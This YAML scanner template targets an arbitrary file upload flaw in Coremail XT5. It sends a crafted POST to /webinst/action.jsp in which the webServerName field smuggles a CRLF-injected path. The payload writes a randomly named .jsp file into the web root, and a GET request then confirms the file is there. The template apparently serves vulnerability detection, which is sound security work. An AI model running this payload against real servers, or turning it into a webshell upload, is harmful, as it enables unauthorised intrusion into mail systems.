name: poc-yaml-coremail-xt5-arbitrary-file-upload-rce
binding: 44338988-a39f-4c00-afba-624206631e23
manual: true
detail:
    author: Kai
    links:
        - https://github.com/jimoyong/CoreMailUploadRce/blob/main/coremail_upload.py
    vulnerability:
        id: CT-381857
        level: critical
    warning: 注意该脚本会上传文件产生一个临时的无害文件
transport: http
set:
    fileName: randomLowercase(8)
    fileContent: randomLowercase(50)
rules:
    r0:
        request:
            cache: true
            method: POST
            path: /webinst/action.jsp
            headers:
                Content-Type: application/x-www-form-urlencoded
            body: func=checkserver&webServerName=127.0.0.1:6132/%0d@/home/coremail/web/webapp/{{fileName}}.jsp%20{{fileContent}}
        expression: response.status == 200
    r1:
        request:
            cache: true
            method: GET
            path: /coremail/{{fileName}}.jsp
        expression: response.body.bcontains(bytes(fileContent)) && response.status == 200
expression: r0() && r1()
